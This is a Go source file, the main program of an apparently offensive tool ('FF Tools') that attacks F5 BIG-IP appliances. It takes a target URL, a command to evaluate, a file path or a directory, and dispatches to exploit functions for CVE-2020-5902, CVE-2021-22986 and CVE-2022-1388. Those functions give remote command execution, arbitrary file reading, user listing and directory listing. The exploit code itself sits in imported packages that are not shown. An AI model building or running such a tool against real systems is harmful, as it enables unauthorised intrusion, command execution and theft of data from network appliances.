package main

import (
	"F5-BIG-IP-TOOLS/pkg/cve_2020-5902"
	"F5-BIG-IP-TOOLS/pkg/cve_2021_22986"
	"F5-BIG-IP-TOOLS/pkg/cve_2022_1388"
	"flag"
	"fmt"
	"github.com/dimiro1/banner"
	"github.com/mattn/go-colorable"
	"os"
)

var (
	urlInput string
	command  string
	vul      string
	method   string
	filename string
	dirPath  string
)

func usage() {
	fmt.Println(`Usage of main.exe:
	-u url
		you target, example: https://192.168.1.1
	-c command to eval
		you command to eval, example: id
	-v the vul to use
		options: cve-2022-1388 cve-2021-22986 cve-2020-5902
	-m only use in cve-2020-5902
		options: fileRead userList dirList`)
}

func bannerPrint() {
	bannerTemplate := fmt.Sprintf(`{{ .Title "%s" "smisome1" 4}}`, "FF Tools")
	banner.InitString(colorable.NewColorableStdout(), true, true, bannerTemplate)
	fmt.Println("by    JsonGMax")
}

func main() {
	flag.StringVar(&urlInput, "u", "", "target")
	flag.StringVar(&command, "c", "", "command")
	flag.StringVar(&vul, "v", "", "vul")
	flag.StringVar(&method, "m", "", "method")
	flag.StringVar(&filename, "f", "", "filename")
	flag.StringVar(&dirPath, "d", "", "dirPath")
	flag.Usage = usage
	flag.Parse()
	bannerPrint()
	if urlInput == "" {
		usage()
		os.Exit(0)
	}
	switch vul {
	case "cve-2022-1388":
		{
			cve_2022_1388.Poc(urlInput, command, vul)
		}
	case "cve-2021-22986":
		{
			cve_2021_22986.Poc(urlInput, command, vul)
		}
	case "cve-2020-5902":
		if method == "" && command == "" {
			usage()
			os.Exit(0)
		}
		{
			switch method {
			case "fileRead":
				{
					if filename == "" {
						usage()
						os.Exit(0)
					}
					cve_2020_5902.FileRead(urlInput, method, vul, filename)
				}

			case "userList":
				{
					cve_2020_5902.UserList(urlInput, method, vul)
				}

			case "dirList":
				{
					if dirPath == "" {
						usage()
						os.Exit(0)
					}
					cve_2020_5902.DirList(urlInput, method, vul, dirPath)
				}
			default:
				{
					if command == "" {
						usage()
						os.Exit(0)
					}
					cve_2020_5902.Exploit(urlInput, vul, command)
				}

			}
		}
	default:
		{
			usage()
		}
	}
}
